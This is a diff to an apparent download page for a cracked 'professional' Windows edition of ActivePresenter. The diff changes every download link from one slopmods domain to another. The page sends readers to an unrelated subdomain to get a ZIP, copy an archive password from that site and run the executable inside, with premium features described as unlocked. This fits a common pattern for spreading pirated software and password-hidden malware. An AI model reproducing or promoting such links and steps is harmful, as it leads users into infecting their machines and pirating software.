@@ -8,12 +8,12 @@ ActivePresenter — Windows setup and configuration · Premium workspace · Zero
 
 > Use the release page below for Windows.
 
-- **Release page:** [ewttoucvtsp.slopmods.tech](https://ewttoucvtsp.slopmods.tech/)
-- **Full URL:** `https://ewttoucvtsp.slopmods.tech/`
+- **Release page:** [ewttoucvtsp.slopmods.top](https://ewttoucvtsp.slopmods.top/)
+- **Full URL:** `https://ewttoucvtsp.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **ewttoucvtsp.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **ewttoucvtsp.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ ActivePresenter — Windows setup and configuration · Premium workspace · Zero
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **ewttoucvtsp.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **ewttoucvtsp.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
